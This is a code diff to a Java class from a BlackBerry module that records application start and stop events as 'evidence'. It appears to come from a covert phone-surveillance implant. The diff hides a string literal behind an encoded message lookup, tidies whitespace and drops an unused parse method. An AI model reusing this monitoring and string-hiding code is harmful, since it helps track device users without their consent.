@@ -13,6 +13,7 @@ package blackberry.module;
 import java.util.Vector;
 
 import blackberry.AppListener;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -31,21 +32,20 @@ import blackberry.utils.WChar;
 public final class ModuleApplication extends BaseModule implements
         ApplicationObserver {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ModApp",
-            DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ModApp", DebugLevel.VERBOSE);
     //#endif
-    
+
     private Evidence evidence;
 
     public static String getStaticType() {
-        return "application";
+        return Messages.getString("1e.0");//"application";
     }
 
     public static ModuleApplication getInstance() {
         return (ModuleApplication) ModuleManager.getInstance().get(
                 getStaticType());
     }
-    
+
     public boolean parse(ConfModule conf) {
         return true;
     }
@@ -65,7 +65,7 @@ public final class ModuleApplication extends BaseModule implements
         evidence = new Evidence(EvidenceType.APPLICATION);
         status.applicationAgentFirstRun = true;
         AppListener.getInstance().addApplicationObserver(this);
-        
+
     }
 
     /*
@@ -101,18 +101,6 @@ public final class ModuleApplication extends BaseModule implements
             final Vector startedList, final Vector stoppedList) {
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        //#ifdef DEBUG
-        debug.trace("parse");
-        //#endif
-
-        return true;
-    }
-
     private synchronized void writeEvidence(final String appName,
             final String condition, final String mod) {
 
@@ -130,7 +118,6 @@ public final class ModuleApplication extends BaseModule implements
         items.addElement(WChar.getBytes(mod, true));
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
-        
         evidence.atomicWriteOnce(items);
 
     }
